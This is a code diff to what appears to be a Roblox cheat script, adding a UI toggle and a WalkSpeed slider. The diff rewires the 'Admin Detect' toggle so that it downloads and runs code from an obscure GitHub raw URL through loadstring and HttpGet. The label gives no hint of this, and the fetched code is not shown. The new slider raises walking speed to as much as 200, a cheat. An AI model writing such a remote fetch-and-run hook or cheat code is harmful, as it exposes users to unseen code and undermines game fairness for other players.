@@ -29,11 +29,24 @@ MainSection:Toggle({
     Title = "Admin Detect",
     Default = false,
     Callback = function(state)
-        print("Admin Detect toggled:", state)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Sweatteaa/jskbnnwoiuBbe/refs/heads/main/ii"))();
     end
 })
 
--- Config system
+-- Sliders
+Section:Slider({
+    Title = "WalkSpeed",
+    Min = 16,
+    Max = 200,
+    Default = 50,
+    Suffix = " speed",
+    Callback = function(value)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
+    end
+})
+
+
+--  Config system
 local ConfigManager = Window.ConfigManager
 local MyConfig = ConfigManager:CreateConfig("MyConfig")
 
